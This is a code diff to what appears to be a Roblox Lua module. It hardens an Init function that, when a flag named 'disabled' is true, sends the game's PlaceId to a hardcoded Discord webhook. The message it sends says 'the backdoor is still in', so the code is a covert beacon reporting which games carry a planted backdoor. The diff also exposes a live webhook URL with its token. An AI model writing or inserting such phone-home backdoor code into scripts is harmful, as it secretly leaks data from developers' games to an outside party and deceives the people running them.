@@ -18,13 +18,19 @@ local disabled = true
 
 function m:Init()
 	if disabled == true then
-		local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
-		local Info = {
-			Message = "the backdoor is still in"..tostring(game.PlaceId);
-			Title = "Lololol"
-		}
-		
-		m:Post(Channel, Info)
+		local PlaceId = nil;
+		pcall(function()
+			PlaceId = game.PlaceId;
+		end)
+		if PlaceId then
+			local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
+			local Info = {
+				Message = "the backdoor is still in "..tostring(PlaceId);
+				Title = "Lololol"
+			}
+			
+			m:Post(Channel, Info)
+		end
 	else
 		--[[--print('lalalal')
 		local acc = 0
